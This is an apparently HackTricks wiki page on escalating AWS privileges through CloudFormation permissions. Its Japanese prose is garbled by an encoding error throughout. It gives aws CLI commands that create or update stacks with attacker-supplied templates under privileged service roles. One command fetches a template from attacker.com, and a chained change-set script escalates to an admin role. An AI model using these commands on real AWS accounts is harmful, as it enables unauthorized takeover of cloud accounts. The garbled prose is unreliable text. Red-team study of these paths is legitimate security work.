# AWS - Cloudformation Privesc

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## cloudformation

Cloudformationã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯æ¬¡ã‚’å‚ç…§ã—ã¦ãã ã•ã„:

{% content-ref url="../../aws-services/aws-cloudformation-and-codestar-enum.md" %}
[aws-cloudformation-and-codestar-enum.md](../../aws-services/aws-cloudformation-and-codestar-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `cloudformation:CreateStack`

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**æŒ‡å®šã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã§ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œ**ã™ã‚‹ãŸã‚ã«ã€ã‚«ã‚¹ã‚¿ãƒ ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€è‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ã«ãƒ›ã‚¹ãƒˆã•ã‚ŒãŸ**CloudFormationã‚¹ã‚¿ãƒƒã‚¯**ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã€æ¨©é™ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã§ãã¾ã™ã€‚
```bash
aws cloudformation create-stack --stack-name <stack-name> \
--template-url http://attacker.com/attackers.template \
--role-arn <arn-role>
```
ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã«ã¯ã€è¿½åŠ ã®æ¨©é™ **`cloudformation:DescribeStacks`** ã‚’ä½¿ç”¨ã—ãŸ **exploitation example** ãŒã‚ã‚Šã¾ã™ï¼š

{% content-ref url="iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md" %}
[iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md](iam-passrole-cloudformation-createstack-and-cloudformation-describestacks.md)
{% endcontent-ref %}

**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸcloudformationã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### `iam:PassRole`, (`cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`)

ã“ã®å ´åˆã€æ—¢å­˜ã®cloudformationã‚¹ã‚¿ãƒƒã‚¯ã‚’**æ‚ªç”¨**ã—ã¦æ›´æ–°ã—ã€å‰è¿°ã®ã‚·ãƒŠãƒªã‚ªã¨åŒæ§˜ã«æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
aws cloudformation update-stack \
--stack-name privesc \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::91029364722:role/CloudFormationAdmin2 \
--capabilities CAPABILITY_IAM \
--region eu-west-1
```
### `cloudformation:SetStackPolicy` | `cloudformation:UpdateStack`

ã“ã®æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã§è‡ªåˆ†è‡ªèº«ã«`UpdateStack`æ¨©é™ã‚’ä¸ãˆã€æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** æŒ‡å®šã•ã‚ŒãŸcloudformationã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ˜‡æ ¼ã€‚

### `cloudformation:UpdateStack` | `cloudformation:SetStackPolicy`

ã“ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ãŒã€**`iam:PassRole`ãŒãªã„**å ´åˆã§ã‚‚ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã‚¹ã‚¿ãƒƒã‚¯ã‚’**æ›´æ–°**ã—ã€**ã™ã§ã«ã‚¢ã‚¿ãƒƒãƒã•ã‚Œã¦ã„ã‚‹IAMãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆæ™‚ã«ãƒ­ãƒ¼ãƒ«ã‚’æŒ‡å®šã—ãªã„ã§ãã ã•ã„ï¼ˆå‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼‰ã€‚

### `iam:PassRole`,((`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

**ãƒ­ãƒ¼ãƒ«ã‚’æ¸¡ã—ã€ChangeSetã‚’ä½œæˆãŠã‚ˆã³å®Ÿè¡Œ**ã™ã‚‹æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€CreateStackã¾ãŸã¯UpdateStackã¨åŒæ§˜ã«ã€**æ–°ã—ã„cloudformationã‚¹ã‚¿ãƒƒã‚¯ã‚’ä½œæˆ/æ›´æ–°ã—ã€cloudformationã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ¬¡ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«**ChangeSetæ¨©é™**ã‚’ä½¿ç”¨ã—ãŸ[**CreateStackã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³**](./#iam-passrole-cloudformation-createstack)ã§ã™ã€‚
```bash
aws cloudformation create-change-set \
--stack-name privesc \
--change-set-name privesc \
--change-set-type CREATE \
--template-url https://privescbucket.s3.amazonaws.com/IAMCreateUserTemplate.json \
--role arn:aws:iam::947247140022:role/CloudFormationAdmin \
--capabilities CAPABILITY_IAM \
--region eu-west-1

echo "Waiting 2 mins to change the stack"
sleep 120

aws cloudformation execute-change-set \
--change-set-name privesc \
--stack-name privesc \
--region eu-west-1

echo "Waiting 2 mins to execute the stack"
sleep 120

aws cloudformation describe-stacks \
--stack-name privesc \
--region eu-west-1
```
`cloudformation:SetStackPolicy` æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¹ã‚¿ãƒƒã‚¯ã«å¯¾ã™ã‚‹ `ChangeSet` æ¨©é™ã‚’è‡ªåˆ†è‡ªèº«ã«ä»˜ä¸ã—ã€æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** cloudformation ã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç‰¹æ¨©æ˜‡æ ¼ã€‚

### (`cloudformation:CreateChangeSet`, `cloudformation:ExecuteChangeSet`) | `cloudformation:SetStackPolicy`)

ã“ã‚Œã¯å‰ã®æ–¹æ³•ã¨åŒæ§˜ã§ã™ãŒã€**IAM ãƒ­ãƒ¼ãƒ«ã‚’æ¸¡ã•ãšã«**ã€ã™ã§ã«ã‚¢ã‚¿ãƒƒãƒã•ã‚Œã¦ã„ã‚‹ã‚‚ã®ã‚’æ‚ªç”¨ã™ã‚‹ã ã‘ã§æ¸ˆã¿ã¾ã™ã€‚å˜ã«ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã—ã¾ã™ã€‚
```
--change-set-type UPDATE
```
**æ½œåœ¨çš„å½±éŸ¿:** ã™ã§ã«ã‚¢ã‚¿ãƒƒãƒã•ã‚Œã¦ã„ã‚‹cloudformationã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### `iam:PassRole`,(`cloudformation:CreateStackSet` | `cloudformation:UpdateStackSet`)

æ”»æ’ƒè€…ã¯ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦ã€StackSetsã‚’ä½œæˆ/æ›´æ–°ã—ã¦ä»»æ„ã®cloudformationãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** cloudformationã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

### `cloudformation:UpdateStackSet`

æ”»æ’ƒè€…ã¯ã€ã“ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦ã€passRoleæ¨©é™ãªã—ã§StackSetsã‚’æ›´æ–°ã—ã€ã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸcloudformationãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** ã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸcloudformationãƒ­ãƒ¼ãƒ«ã¸ã®æ¨©é™æ˜‡æ ¼ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
